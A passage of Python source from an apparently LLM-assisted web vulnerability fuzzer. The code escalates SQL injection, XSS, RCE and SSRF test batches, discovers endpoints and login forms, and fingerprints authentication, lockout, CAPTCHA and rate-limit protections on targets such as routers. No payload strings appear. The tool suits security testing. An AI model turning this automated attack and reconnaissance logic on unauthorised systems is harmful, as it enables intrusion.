        if escalation_key in self.findings_triggered_escalation:
            return  # Already escalated
        
        self.findings_triggered_escalation.add(escalation_key)
        logger.info(f"Auto-escalation triggered for {escalation_key}")
        
        # Generate more payloads for this technique
        if task.parameter:
            param_context = ParameterContext(
                name=task.parameter,
                inferred_type=ParameterType.STRING,  # Assume string for escalation
            )
            
            # Get extended payloads
            additional_payloads = _payload_generator.generate_payloads(
                param_context, task.technique, None, max_payloads=20
            )
            
            # Create escalation tasks
            for i in range(0, len(additional_payloads), 5):
                batch = additional_payloads[i:i+5]
                escalation_task = TestTask(
                    id=f"{task.endpoint}:{task.parameter}:{task.technique}:escalate:{uuid.uuid4().hex[:6]}",
                    endpoint=task.endpoint,
                    technique=task.technique,
                    parameter=task.parameter,
                    method=task.method,
                    priority=task.priority + 5,  # Higher priority
                    payloads=batch,
                )
                # Insert at front of queue
                self.task_queue.insert(0, escalation_task)
        
        # Also test related techniques
        related_techniques = {
            "sqli": ["blind_sqli", "nosqli"],
            "xss": ["dom_xss", "ssti"],
            "rce": ["ssti", "deserialization"],
            "ssrf": ["path_traversal"],
        }
        
        for related in related_techniques.get(task.technique, []):
            related_task = TestTask(
                id=f"{task.endpoint}:{task.parameter or 'generic'}:{related}:related:{uuid.uuid4().hex[:6]}",
                endpoint=task.endpoint,
                technique=related,
                parameter=task.parameter,
                method=task.method,
                priority=task.priority + 3,
                payloads=_graceful_degradation.get_rule_based_payloads(related)[:10],
            )
            self.task_queue.insert(0, related_task)
    
    def handle_finding_escalation(self, endpoint: str, technique: str, result: Dict[str, Any]):
        """
        Public method to handle escalation when a finding is detected.
        
        Called from the main fuzzer loop when findings are recorded.
        """
        if not self.auto_escalation_enabled:
            return
        
        escalation_key = f"{endpoint}:{technique}"
        
        if escalation_key in self.findings_triggered_escalation:
            return  # Already escalated
        
        self.findings_triggered_escalation.add(escalation_key)
        logger.info(f"Finding escalation triggered for {escalation_key}")
        
        # Create a synthetic task for escalation
        synthetic_task = TestTask(
            id=f"{endpoint}:{technique}:finding_escalation:{uuid.uuid4().hex[:6]}",
            endpoint=endpoint,
            technique=technique,
            parameter=None,  # Will test all parameters
            method="GET",
            priority=10,  # High priority
        )
        
        # Trigger internal escalation logic
        self._trigger_escalation(synthetic_task, result)
    
    def get_auto_decision(self, context: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate an automatic decision without LLM.
        
        Used in full_auto mode or as fallback.
        """
        # Get next task
        task = self.get_next_task()
        
        if not task:
            return {
                "decision": "complete",
                "reasoning": "[Auto-pilot] All tasks completed",
                "analysis": f"Coverage: {self.get_coverage_summary()}",
            }
        
        task.status = "running"
        
        return {
            "decision": "generate_payloads",
            "technique": task.technique,
            "payloads": task.payloads,
            "position": "param" if task.parameter else "body",
            "parameter": task.parameter,
            "header": task.header,
            "reasoning": f"[Auto-pilot] Testing {task.technique} on {task.parameter or task.header or 'endpoint'}",
            "analysis": f"Task priority: {task.priority}, Queue remaining: {len([t for t in self.task_queue if t.status == 'pending'])}",
            "_task_id": task.id,  # For tracking
        }
    
    def should_use_llm(self, iteration: int, findings_count: int) -> bool:
        """Determine if LLM should be consulted based on mode."""
        if self.mode == AutoPilotMode.DISABLED:
            return True
        elif self.mode == AutoPilotMode.ASSISTED:
            return True  # Always use LLM but provide suggestions
        elif self.mode == AutoPilotMode.SEMI_AUTO:
            # Use LLM every 5th iteration or when findings detected
            return iteration % 5 == 0 or findings_count > 0
        elif self.mode == AutoPilotMode.FULL_AUTO:
            # Only use LLM for analysis of findings
            return findings_count > 0 and iteration % 10 == 0
        return True
    
    def get_coverage_summary(self) -> Dict[str, Any]:
        """Get a summary of testing coverage."""
        total_tasks = len(self.task_queue)
        completed = len([t for t in self.task_queue if t.status == "completed"])
        failed = len([t for t in self.task_queue if t.status == "failed"])
        pending = len([t for t in self.task_queue if t.status == "pending"])
        
        return {
            "total_tasks": total_tasks,
            "completed": completed,
            "failed": failed,
            "pending": pending,
            "completion_percentage": (completed / total_tasks * 100) if total_tasks > 0 else 0,
            "escalations_triggered": len(self.findings_triggered_escalation),
            "coverage_by_endpoint": self.coverage.to_dict(),
        }
    
    def get_stats(self) -> Dict[str, Any]:
        """Get automation engine statistics."""
        return {
            "mode": self.mode.value,
            "auto_escalation_enabled": self.auto_escalation_enabled,
            "task_queue_size": len(self.task_queue),
            "pending_tasks": len([t for t in self.task_queue if t.status == "pending"]),
            "completed_tasks": len(self.completed_tasks),
            "escalations": len(self.findings_triggered_escalation),
            "coverage": self.get_coverage_summary(),
        }
    
    def reset(self):
        """Reset the automation engine."""
        self.coverage = CoverageState()
        self.task_queue = []
        self.completed_tasks = []
        self.findings_triggered_escalation = set()


# Global automation engine instance
_automation_engine = AutomationEngine()


# =============================================================================
# HTML PARSER FOR AUTO-DISCOVERY
# =============================================================================

class EndpointDiscoveryParser(HTMLParser):
    """Parse HTML to discover endpoints, forms, and parameters."""
    
    def __init__(self):
        super().__init__()
        self.links: Set[str] = set()
        self.forms: List[Dict[str, Any]] = []
        self.scripts: Set[str] = set()
        self.current_form: Optional[Dict[str, Any]] = None
        self.hidden_inputs: List[Dict[str, str]] = []
        self.api_endpoints: Set[str] = set()
        # Track standalone inputs (outside forms or with id instead of name)
        self.standalone_inputs: List[Dict[str, str]] = []
    
    def handle_starttag(self, tag: str, attrs: List[Tuple[str, str]]):
        attrs_dict = dict(attrs)
        
        if tag == "a":
            href = attrs_dict.get("href", "")
            if href and not href.startswith(("#", "javascript:", "mailto:")):
                self.links.add(href)
        
        elif tag == "form":
            self.current_form = {
                "action": attrs_dict.get("action", ""),
                "method": attrs_dict.get("method", "GET").upper(),
                "id": attrs_dict.get("id", ""),
                "inputs": [],
            }
        
        elif tag == "input":
            # Get name OR id (some routers use id instead of name)
            input_name = attrs_dict.get("name", "") or attrs_dict.get("id", "")
            input_type = attrs_dict.get("type", "text")
            input_value = attrs_dict.get("value", "")
            input_id = attrs_dict.get("id", "")
            
            input_data = {
                "name": input_name,
                "id": input_id,
                "type": input_type,
                "value": input_value,
            }
            
            if self.current_form is not None:
                # Inside a form
                if input_name or input_id:
                    self.current_form["inputs"].append(input_data)
                    if input_type == "hidden":
                        self.hidden_inputs.append(input_data)
            else:
                # Standalone input (common in JS-rendered login pages)
                if input_name or input_id:
                    self.standalone_inputs.append(input_data)
                    if input_type == "hidden":
                        self.hidden_inputs.append(input_data)
        
        elif tag == "script":
            src = attrs_dict.get("src", "")
            if src:
                self.scripts.add(src)
        
        elif tag == "link":
            href = attrs_dict.get("href", "")
            rel = attrs_dict.get("rel", "")
            if "api" in rel.lower() or "preload" in rel.lower():
                self.api_endpoints.add(href)
    
    def handle_endtag(self, tag: str):
        if tag == "form" and self.current_form:
            self.forms.append(self.current_form)
            self.current_form = None
    
    def handle_data(self, data: str):
        # Look for API endpoints in inline scripts - GENERAL PURPOSE EXTRACTION
        # This finds endpoints from ANY JavaScript code, not just specific libraries
        # Now also detects HTTP methods from context
        
        # Patterns that include method detection (method, path)
        method_aware_patterns = [
            # fetch with method: fetch("/api", {method: "POST"})
            (r'fetch\s*\(\s*["\']([^"\']+)["\'][^)]*method\s*:\s*["\'](\w+)["\']', 2, 1),  # (pattern, method_group, path_group)
            # axios.post("/path"), axios.get("/path"), etc.
            (r'axios\.(get|post|put|delete|patch)\s*\(\s*["\']([^"\']+)["\']', 1, 2),
            # $.ajax with type/method
            (r'\.ajax\s*\(\s*{[^}]*(?:type|method)\s*:\s*["\'](\w+)["\'][^}]*url\s*:\s*["\']([^"\']+)["\']', 1, 2),
            (r'\.ajax\s*\(\s*{[^}]*url\s*:\s*["\']([^"\']+)["\'][^}]*(?:type|method)\s*:\s*["\'](\w+)["\']', 2, 1),
            # XMLHttpRequest.open("POST", "/path")
            (r'\.open\s*\(\s*["\'](\w+)["\']\s*,\s*["\']([^"\']+)["\']', 1, 2),
            # fetch("/path") - default GET
            (r'fetch\s*\(\s*["\']([^"\']+)["\'](?:\s*\)|\s*,\s*{(?![^}]*method))', None, 1),
            # Form submissions (always POST)
            (r'\.submit\s*\(\s*["\']([^"\']+)["\']', 'POST', 1),
            # SRP/Auth patterns - typically POST
            (r'\w+\.(?:identify|authenticate|login|verify|submit|post)\s*\(\s*["\']([^"\']+)["\']', 'POST', 1),
            # GET patterns
            (r'\w+\.(?:get|fetch|load|read|retrieve)\s*\(\s*["\']([^"\']+)["\']', 'GET', 1),
            # PUT/PATCH patterns
            (r'\w+\.(?:update|patch|put|modify)\s*\(\s*["\']([^"\']+)["\']', 'PUT', 1),
            # DELETE patterns
            (r'\w+\.(?:delete|remove|destroy)\s*\(\s*["\']([^"\']+)["\']', 'DELETE', 1),
        ]
        
        for pattern_info in method_aware_patterns:
            pattern, method_group, path_group = pattern_info
            try:
                matches = re.findall(pattern, data, re.IGNORECASE | re.DOTALL)
                for match in matches:
                    if isinstance(match, tuple):
                        if method_group is None:
                            # Default GET for patterns without method
                            method = "GET"
                            path = match[path_group - 1] if path_group <= len(match) else match[0]
                        elif isinstance(method_group, str):
                            # Fixed method (like "POST" for .submit())
                            method = method_group
                            path = match[path_group - 1] if path_group <= len(match) else match[0]
                        else:
                            # Extract method from match group
                            method = match[method_group - 1].upper() if method_group <= len(match) else "GET"
                            path = match[path_group - 1] if path_group <= len(match) else match[0]
                    else:
                        path = match
                        method = method_group if isinstance(method_group, str) else "GET"
                    
                    if path and len(path) > 1:
                        # Validation
                        if not (path.startswith(('http', '/', '.')) or '/' in path or 
                                path.endswith(('.cgi', '.asp', '.php', '.action', '.lp', '.jsp'))):
                            continue
                        if path in ('/', '//', 'http://', 'https://'):
                            continue
                        if any(x in path.lower() for x in ['function', 'undefined', 'null', 'true', 'false']):
                            continue
                        # Store as tuple (path, method)
                        self.api_endpoints.add((path, method))
            except Exception:
                pass
        
        # Fallback patterns - method unknown, default to POST for auth-like, GET otherwise
        fallback_patterns = [
            # URL assignments - context determines method
            (r'(?:authUrl|loginUrl|submitUrl|postUrl)\s*[=:]\s*["\']([^"\']+)["\']', 'POST'),
            (r'(?:apiUrl|endpoint|baseUrl|url|fetchUrl|getUrl)\s*[=:]\s*["\']([^"\']+)["\']', 'GET'),
            # Auth endpoints (usually POST)
            (r'["\'](\/(?:authenticate|identify|login|logout|auth|session|token|verify|oauth)[^"\']*)["\']', 'POST'),
            # API/REST endpoints (default GET)
            (r'["\']/(api|v\d+|rest)/[^"\']+["\']', 'GET'),
            # CGI/form handlers (usually POST)
            (r'["\']/(cgi-bin|goform|jnap|hnap|apply|service)[^"\']*["\']', 'POST'),
            # File extensions
            (r'["\']([^"\']+\.(?:cgi|asp|aspx|php|action|do|jsp|lp)(?:\?[^"\']*)?)["\']', 'GET'),
        ]
        
        for pattern, default_method in fallback_patterns:
            try:
                matches = re.findall(pattern, data, re.IGNORECASE)
                for match in matches:
                    path = match[0] if isinstance(match, tuple) else match
                    if path and len(path) > 1:
                        if not (path.startswith(('http', '/', '.')) or '/' in path):
                            continue
                        if path in ('/', '//', 'http://', 'https://'):
                            continue
                        if any(x in path.lower() for x in ['function', 'undefined', 'null', 'true', 'false']):
                            continue
                        # Don't override if we already have this path with a method
                        if not any(ep[0] == path for ep in self.api_endpoints if isinstance(ep, tuple)):
                            self.api_endpoints.add((path, default_method))
            except Exception:
                pass


# =============================================================================
# ENHANCED RECONNAISSANCE - AUTHENTICATION & SECURITY DISCOVERY
# =============================================================================

class AuthMechanism(str, Enum):
    """Detected authentication mechanisms."""
    BASIC = "basic"
    DIGEST = "digest"
    BEARER = "bearer"
    JWT = "jwt"
    OAUTH2 = "oauth2"
    SAML = "saml"
    SRP = "srp"  # Secure Remote Password (like Vodafone router)
    FORM_BASED = "form_based"
    API_KEY = "api_key"
    CERTIFICATE = "certificate"
    KERBEROS = "kerberos"
    NTLM = "ntlm"
    CUSTOM = "custom"
    UNKNOWN = "unknown"


@dataclass
class AuthenticationInfo:
    """Detailed information about discovered authentication."""
    mechanism: AuthMechanism
    login_endpoint: Optional[str] = None
    auth_endpoint: Optional[str] = None
    logout_endpoint: Optional[str] = None
    username_field: Optional[str] = None
    password_field: Optional[str] = None
    token_field: Optional[str] = None
    csrf_token_name: Optional[str] = None
    csrf_token_value: Optional[str] = None
    hidden_fields: List[Dict[str, str]] = field(default_factory=list)
    auth_headers: List[str] = field(default_factory=list)
    cookies_required: List[str] = field(default_factory=list)
    mfa_detected: bool = False
    captcha_detected: bool = False
    rate_limit_detected: bool = False
    lockout_detected: bool = False
    lockout_threshold: Optional[int] = None
    lockout_duration: Optional[int] = None
    session_token_name: Optional[str] = None
    oauth_endpoints: Dict[str, str] = field(default_factory=dict)
    srp_details: Dict[str, Any] = field(default_factory=dict)
    confidence: float = 0.0
    raw_evidence: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "mechanism": self.mechanism.value,
            "login_endpoint": self.login_endpoint,
            "auth_endpoint": self.auth_endpoint,
            "logout_endpoint": self.logout_endpoint,
            "username_field": self.username_field,
            "password_field": self.password_field,
            "token_field": self.token_field,
            "csrf_token_name": self.csrf_token_name,
            "csrf_token_value": self.csrf_token_value[:20] + "..." if self.csrf_token_value and len(self.csrf_token_value) > 20 else self.csrf_token_value,
            "hidden_fields": self.hidden_fields,
            "mfa_detected": self.mfa_detected,
            "captcha_detected": self.captcha_detected,
            "rate_limit_detected": self.rate_limit_detected,
            "lockout_detected": self.lockout_detected,
            "lockout_threshold": self.lockout_threshold,
            "lockout_duration": self.lockout_duration,
            "oauth_endpoints": self.oauth_endpoints,
            "srp_details": self.srp_details,
            "confidence": self.confidence,
        }


@dataclass
class SecurityFeatures:
    """Detected security features and protections."""
    csrf_protection: bool = False
    csrf_token_name: Optional[str] = None
    content_security_policy: bool = False
    csp_header: Optional[str] = None
    x_frame_options: bool = False
    x_content_type_options: bool = False
    strict_transport_security: bool = False
    referrer_policy: bool = False
    cors_configured: bool = False
    cors_allow_origin: Optional[str] = None
    rate_limiting: bool = False
    rate_limit_header: Optional[str] = None
    brute_force_protection: bool = False
    account_lockout: bool = False
    captcha_protection: bool = False
    captcha_type: Optional[str] = None  # recaptcha, hcaptcha, custom
    input_validation: bool = False
    output_encoding: bool = False
    cookie_flags: Dict[str, List[str]] = field(default_factory=dict)  # cookie_name -> [HttpOnly, Secure, SameSite]
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass 
class ReconnaissanceResult:
    """Complete reconnaissance results for a target."""
    target_url: str
    authentication: Optional[AuthenticationInfo] = None
    security_features: Optional[SecurityFeatures] = None
    discovered_endpoints: List[Any] = field(default_factory=list)  # List of DiscoveredEndpoint (forward ref)
    discovered_forms: List[Dict[str, Any]] = field(default_factory=list)
    discovered_parameters: List[str] = field(default_factory=list)
    api_patterns: List[Dict[str, Any]] = field(default_factory=list)
    javascript_functions: List[Dict[str, str]] = field(default_factory=list)
    meta_info: Dict[str, str] = field(default_factory=dict)
    comments: List[str] = field(default_factory=list)
    interesting_strings: List[str] = field(default_factory=list)
    technology_hints: List[str] = field(default_factory=list)
    potential_vulnerabilities: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "target_url": self.target_url,
            "authentication": self.authentication.to_dict() if self.authentication else None,
            "security_features": self.security_features.to_dict() if self.security_features else None,
            "discovered_endpoints": [e.to_dict() if hasattr(e, 'to_dict') else e for e in self.discovered_endpoints],
            "discovered_forms": self.discovered_forms,
            "discovered_parameters": self.discovered_parameters,
            "api_patterns": self.api_patterns,
            "javascript_functions": self.javascript_functions,
            "meta_info": self.meta_info,
            "comments": self.comments[:20],  # Limit
            "interesting_strings": self.interesting_strings[:50],
            "technology_hints": self.technology_hints,
            "potential_vulnerabilities": self.potential_vulnerabilities,
        }


class EnhancedReconnaissanceEngine:
    """
    Advanced reconnaissance engine that discovers authentication mechanisms,
    security features, API patterns, and potential attack vectors.
    
    This does what a security researcher would do manually:
    1. Analyze HTML for forms, hidden fields, CSRF tokens
    2. Parse JavaScript for API calls, auth functions, endpoints
    3. Detect authentication mechanisms (SRP, OAuth, JWT, etc.)
    4. Identify security features (rate limiting, lockout, CAPTCHA)
    5. Extract interesting strings, comments, and technology hints
    """
    
    # Authentication mechanism patterns
    AUTH_PATTERNS = {
        AuthMechanism.SRP: [
            r'srp\.identify\s*\(\s*["\']([^"\']+)["\']',  # SRP auth endpoint
            r'new\s+SRP\s*\(',  # SRP instantiation
            r'srp[-_]?min\.js',  # SRP library
            r'SecureRemotePassword',
            r'srpClient',
            # Additional SRP patterns for router/IoT devices
            r'SRP6[a]?(?:Client|Server)?',
            r'srp\s*[=:]\s*(?:new|require)',
            r'srp\s*\.\s*(?:init|create|setup|identify|authenticate)',
            r'api/auth/identify',  # Common SRP identify endpoint
            r'api/auth/authenticate',  # Common SRP authenticate endpoint
            r'/identify',  # Short form endpoints
            r'/authenticate',
            r'["\']challenge["\']',  # Challenge-response keywords
            r'["\']verifier["\']',
            r'clientProof',
            r'serverProof',
        ],
        AuthMechanism.OAUTH2: [
            r'/oauth2?/authorize',
            r'/oauth2?/token',
            r'client_id\s*[=:]\s*["\']([^"\']+)["\']',
            r'redirect_uri\s*[=:]\s*["\']([^"\']+)["\']',
            r'response_type\s*[=:]\s*["\']code["\']',
            r'grant_type',
        ],
        AuthMechanism.JWT: [
            r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',  # JWT pattern
            r'jwt\.decode',
            r'jwt\.sign',
            r'jsonwebtoken',
            r'Authorization:\s*Bearer',
        ],
        AuthMechanism.SAML: [
            r'SAMLRequest',
            r'SAMLResponse',
            r'/saml/sso',
            r'/saml/acs',
            r'saml2',
        ],
        AuthMechanism.BASIC: [
            r'WWW-Authenticate:\s*Basic',
            r'Authorization:\s*Basic',
            r'btoa\s*\(',  # Base64 encoding for basic auth
        ],
        AuthMechanism.API_KEY: [
            r'[xX][-_]?[aA][pP][iI][-_]?[kK][eE][yY]',
            r'api[-_]?key\s*[=:]\s*["\']',
            r'apikey',
            r'[aA]uthorization[-_]?[kK]ey',
        ],
    }
    
    # Security feature patterns
    SECURITY_PATTERNS = {
        "csrf": [
            r'csrf[-_]?token',
            r'_token',
            r'authenticity_token',
            r'__RequestVerificationToken',
            r'CSRFtoken',
            r'_csrf',
            r'csrfmiddlewaretoken',
        ],
        "captcha": [
            r'recaptcha',
            r'hcaptcha', 
            r'g-recaptcha',
            r'captcha[-_]?response',
            r'turnstile',  # Cloudflare
        ],
        "rate_limit": [
            r'rate[-_]?limit',
            r'too\s+many\s+requests',
            r'throttl',
            r'slow\s*down',
            r'retry[-_]?after',
            r'X-RateLimit',
        ],
        "lockout": [
            r'account\s+locked',
            r'login\s+blocked',
            r'temporarily\s+blocked',
            r'try\s+again\s+in\s+(\d+)',
            r'wait\s+(\d+)\s*seconds?',
            r'wrong\s+password.*(\d+)\s+times?',
            r'brute[-_]?force',
        ],
        "mfa": [
            r'two[-_]?factor',
            r'2fa',
            r'mfa',
            r'otp',
            r'authenticator',
            r'verification\s+code',
            r'sms\s+code',
        ],
    }
    
    # API endpoint patterns in JavaScript - GENERAL PURPOSE
    # These patterns find endpoints regardless of the specific library or framework
    JS_API_PATTERNS = [
        # === STANDARD HTTP CLIENT LIBRARIES ===
        # Fetch API
        r'fetch\s*\(\s*["\']([^"\']+)["\']',
        r'fetch\s*\(\s*`([^`]+)`',
        # Axios
        r'axios\.(get|post|put|delete|patch)\s*\(\s*["\']([^"\']+)["\']',
        r'axios\s*\(\s*{\s*url:\s*["\']([^"\']+)["\']',
        # jQuery AJAX
        r'\$\.ajax\s*\(\s*{\s*url:\s*["\']([^"\']+)["\']',
        r'\$\.(get|post)\s*\(\s*["\']([^"\']+)["\']',
        # XMLHttpRequest
        r'\.open\s*\(\s*["\'](?:GET|POST|PUT|DELETE|PATCH)["\']\s*,\s*["\']([^"\']+)["\']',
        
        # === GENERAL FUNCTION CALLS WITH PATH ARGUMENTS ===
        # Any function.method("/path", ...) - catches custom auth libs like srp.identify("/auth", ...)
        r'(\w+)\.(identify|authenticate|login|signin|verify|validate|submit|send|request|call)\s*\(\s*["\']([^"\']+)["\']',
        # Any object.method("/path", ...) where path starts with /
        r'\w+\.\w+\s*\(\s*["\'](\/[^"\']+)["\']',
        # Direct function calls with path arguments: doLogin("/api/login", ...)
        r'(?:do|send|submit|call|make|post|get)(?:Login|Auth|Request|Data)\s*\(\s*["\']([^"\']+)["\']',
        
        # === URL/ENDPOINT VARIABLE DEFINITIONS ===
        r'(?:url|endpoint|uri|href|action|path|route)\s*[=:]\s*["\']([^"\']+)["\']',
        r'(?:baseUrl|baseURL|apiUrl|apiURL|serverUrl|authUrl|loginUrl)\s*[=:]\s*["\']([^"\']+)["\']',
        r'["\']((?:url|endpoint|path|route|api))["\']?\s*:\s*["\']([^"\']+)["\']',
        
        # === PATH PATTERNS THAT LOOK LIKE API ENDPOINTS ===
        # Standard API patterns
        r'["\']/(api|v\d+|rest|graphql|ws)/[^"\']*["\']',
        r'["\']https?://[^"\']+/api/[^"\']*["\']',
        # Auth-related endpoints
        r'["\'](/(?:authenticate|identify|login|logout|signin|signout|auth|session|token|oauth|verify)[^"\']*)["\']',
        # CMS/framework endpoints
        r'["\'](/(?:admin|wp-admin|administrator|manage|config|settings|dashboard)[^"\']*)["\']',
        # IoT/Router/Embedded device patterns
        r'["\'](/(?:cgi-bin|goform|jnap|hnap|apply|service|jsonrpc|rpc|soap)[^"\']*)["\']',
        r'["\']([^"\']*\.(?:cgi|asp|aspx|php|action|do|jsp|lp)[^"\']*)["\']',
        
        # === HTTP METHOD + URL PATTERNS ===
        # Common patterns like: method: "POST", url: "/api/login"
        r'method\s*:\s*["\'](?:POST|PUT|DELETE|PATCH)["\'][^}]*url\s*:\s*["\']([^"\']+)["\']',
        r'url\s*:\s*["\']([^"\']+)["\'][^}]*method\s*:\s*["\'](?:POST|PUT|DELETE|PATCH)["\']',
        
        # === FORM ACTION URLs (from JavaScript) ===
        r'\.action\s*=\s*["\']([^"\']+)["\']',
        r'\.setAttribute\s*\(\s*["\']action["\']\s*,\s*["\']([^"\']+)["\']',
    ]
    
    # Interesting JavaScript function patterns
    JS_FUNCTION_PATTERNS = [
        # Authentication functions
        (r'function\s+(login|authenticate|signIn|doLogin|submitLogin)\s*\([^)]*\)\s*{([^}]+)}', "auth_function"),
        (r'(login|authenticate|signIn)\s*[=:]\s*(?:async\s+)?function\s*\([^)]*\)\s*{([^}]+)}', "auth_function"),
        (r'(login|authenticate|signIn)\s*[=:]\s*(?:async\s+)?\([^)]*\)\s*=>\s*{([^}]+)}', "auth_function"),
        # Password/credential handling
        (r'function\s+(validatePassword|checkPassword|hashPassword)\s*\([^)]*\)', "password_function"),
        # API calls
        (r'function\s+(callAPI|apiRequest|fetchData|sendRequest)\s*\([^)]*\)', "api_function"),
        # Session handling
        (r'function\s+(createSession|destroySession|checkSession|getSession)\s*\([^)]*\)', "session_function"),
        # Token handling
        (r'function\s+(getToken|setToken|refreshToken|validateToken)\s*\([^)]*\)', "token_function"),
        # General endpoint handlers - any function that likely handles API calls
        (r'function\s+(\w*(?:submit|send|request|call|fetch|post|get)\w*)\s*\([^)]*\)', "request_function"),
        # Object method definitions for auth/request handlers
        (r'(\w+)\s*:\s*(?:async\s+)?function\s*\([^)]*\)\s*{[^}]*(?:fetch|axios|ajax|\.open|\.send)[^}]*}', "api_method"),
    ]
    
    def __init__(self):
        self.results_cache: Dict[str, ReconnaissanceResult] = {}
    
    async def perform_reconnaissance(
        self,
        target_url: str,
        html_content: str,
        headers: Dict[str, str],
        cookies: List[str] = None,
        fetch_scripts: bool = True,
    ) -> ReconnaissanceResult:
        """
        Perform comprehensive reconnaissance on a target.
        
        Args:
            target_url: The target URL
            html_content: HTML content of the page
            headers: Response headers
            cookies: Response cookies
            fetch_scripts: Whether to fetch and analyze external JS files
            
        Returns:
            ReconnaissanceResult with all discovered information
        """
        result = ReconnaissanceResult(target_url=target_url)
        
        # Parse HTML structure
        self._analyze_html(result, html_content, target_url)
        
        # Analyze JavaScript (inline and external)
        await self._analyze_javascript(result, html_content, target_url, fetch_scripts)
        
        # Detect authentication mechanism
        self._detect_authentication(result, html_content, headers)
        
        # Detect security features
        self._detect_security_features(result, html_content, headers, cookies)
        
        # Extract interesting strings
        self._extract_interesting_strings(result, html_content)
        
        # Extract HTML comments
        self._extract_comments(result, html_content)
        
        # Detect technologies
        self._detect_technologies(result, html_content, headers)
        
        # Identify potential vulnerabilities
        self._identify_potential_vulnerabilities(result, html_content, headers)
        
        # Cache result
        self.results_cache[target_url] = result
        
        return result
    
    def _analyze_html(self, result: ReconnaissanceResult, html: str, base_url: str):
        """Analyze HTML structure for forms, inputs, meta tags."""
        # Parse with custom parser
        parser = EndpointDiscoveryParser()
        try:
            parser.feed(html)
        except Exception as e:
            logger.warning(f"HTML parsing error: {e}")
            return
        
        # Process discovered forms with enhanced detail
        for form in parser.forms:
            # Check for password field by type OR by id/name containing 'pass' or 'pwd'
            has_password = any(
                inp.get("type") == "password" or 
                "pass" in (inp.get("name", "") + inp.get("id", "")).lower() or
                "pwd" in (inp.get("name", "") + inp.get("id", "")).lower()
                for inp in form.get("inputs", [])
            )
            
            # Check for username field by type or id/name
            has_username = any(
                inp.get("type") in ("text", "email") or
                "user" in (inp.get("name", "") + inp.get("id", "")).lower() or
                "uname" in (inp.get("name", "") + inp.get("id", "")).lower() or
                "login" in (inp.get("name", "") + inp.get("id", "")).lower()
                for inp in form.get("inputs", [])
            )
            
            form_info = {
                "action": form.get("action", ""),
                "method": form.get("method", "GET"),
                "id": form.get("id", ""),
                "inputs": form.get("inputs", []),
                "full_url": urllib.parse.urljoin(base_url, form.get("action", "")) if form.get("action") else base_url,
                "has_password_field": has_password,
                "has_username_field": has_username,
                "has_hidden_fields": any(inp.get("type") == "hidden" for inp in form.get("inputs", [])),
                "hidden_field_names": [inp.get("name") or inp.get("id") for inp in form.get("inputs", []) if inp.get("type") == "hidden"],
                "is_login_form": has_password or "login" in form.get("id", "").lower(),
            }
            result.discovered_forms.append(form_info)
            
            # Add as endpoint - use form id as fallback if no action
            endpoint_url = form_info["full_url"]
            if form_info["is_login_form"]:
                logger.info(f"Login form detected: {form.get('id', 'unknown')} on {base_url}")
            
            if endpoint_url:
                params = [inp.get("name") or inp.get("id") for inp in form.get("inputs", []) if inp.get("name") or inp.get("id")]
                result.discovered_endpoints.append(DiscoveredEndpoint(
                    url=endpoint_url,
                    method=form_info["method"],
                    parameters=params,
                    source="html_form" if not form_info["is_login_form"] else "login_form",
                    confidence=0.98 if form_info["is_login_form"] else 0.95,
                ))
        
        # Process standalone inputs (common in JS-rendered login pages)
        if parser.standalone_inputs:
            standalone_password = None
            standalone_username = None
            
            for inp in parser.standalone_inputs:
                inp_id = inp.get("id", "").lower()
                inp_name = inp.get("name", "").lower()
                inp_type = inp.get("type", "").lower()
                combined = inp_id + inp_name
                
                if inp_type == "password" or "pass" in combined or "pwd" in combined:
                    standalone_password = inp
                elif "user" in combined or "uname" in combined or "login" in combined:
                    standalone_username = inp
            
            if standalone_password:
                # We found a login page with standalone inputs (JS-rendered)
                logger.info(f"Standalone login inputs detected on {base_url}")
                result.discovered_forms.append({
                    "action": "",
                    "method": "POST",
                    "id": "js_login_form",
                    "inputs": parser.standalone_inputs,
                    "full_url": base_url,
                    "has_password_field": True,
                    "has_username_field": standalone_username is not None,
                    "has_hidden_fields": any(inp.get("type") == "hidden" for inp in parser.standalone_inputs),
                    "hidden_field_names": [inp.get("name") or inp.get("id") for inp in parser.standalone_inputs if inp.get("type") == "hidden"],
                    "is_login_form": True,
                    "js_rendered": True,
                    "password_field_id": standalone_password.get("id") or standalone_password.get("name"),
                    "username_field_id": standalone_username.get("id") or standalone_username.get("name") if standalone_username else None,
                })
        
        # Process links
        for link in parser.links:
            full_url = urllib.parse.urljoin(base_url, link)
            parsed = urllib.parse.urlparse(full_url)
            params = list(urllib.parse.parse_qs(parsed.query).keys())
            result.discovered_endpoints.append(DiscoveredEndpoint(
                url=full_url.split("?")[0],
                method="GET",
                parameters=params,
                source="html_link",
                confidence=0.9,
            ))
        
        # Process hidden inputs separately (include id as fallback)
        result.discovered_parameters.extend([
            inp.get("name") or inp.get("id") for inp in parser.hidden_inputs if inp.get("name") or inp.get("id")
        ])
        
        # Extract meta tags
        meta_patterns = [
            (r'<meta\s+name=["\']([^"\']+)["\']\s+content=["\']([^"\']+)["\']', "name"),
            (r'<meta\s+content=["\']([^"\']+)["\']\s+name=["\']([^"\']+)["\']', "content_first"),
            (r'<meta\s+property=["\']([^"\']+)["\']\s+content=["\']([^"\']+)["\']', "property"),
            (r'<meta\s+http-equiv=["\']([^"\']+)["\']\s+content=["\']([^"\']+)["\']', "http_equiv"),
        ]
        
        for pattern, ptype in meta_patterns:
            for match in re.finditer(pattern, html, re.IGNORECASE):
                if ptype == "content_first":
                    result.meta_info[match.group(2)] = match.group(1)
                else:
                    result.meta_info[match.group(1)] = match.group(2)
    
    async def _analyze_javascript(
        self, 
        result: ReconnaissanceResult, 
        html: str, 
        base_url: str,
        fetch_external: bool = True
    ):
        """Analyze JavaScript for API endpoints and auth functions.
        
        Robust implementation that handles:
        - Invalid/malformed HTML
        - Network failures for external scripts
        - Encoding issues
        - Timeouts
        """
        all_js_content = []
        
        # Safely extract inline scripts
        try:
            inline_scripts = re.findall(r'<script[^>]*>([^<]+)</script>', html or "", re.DOTALL | re.IGNORECASE)
            all_js_content.extend([s for s in inline_scripts if s and len(s) < 500000])  # Skip huge scripts
        except Exception as e:
            logger.debug(f"Error extracting inline scripts: {e}")
        
        # Safely extract external script URLs
        script_urls = []
        try:
